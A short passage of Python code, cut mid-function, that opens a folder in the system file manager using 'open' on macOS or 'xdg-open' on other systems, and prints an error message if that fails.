            elif platform.system() == "Darwin":
                subprocess.Popen(["open", path])
            else:
                subprocess.Popen(["xdg-open", path])
        except Exception as e:
            print(f"Could not open folder: {e}")
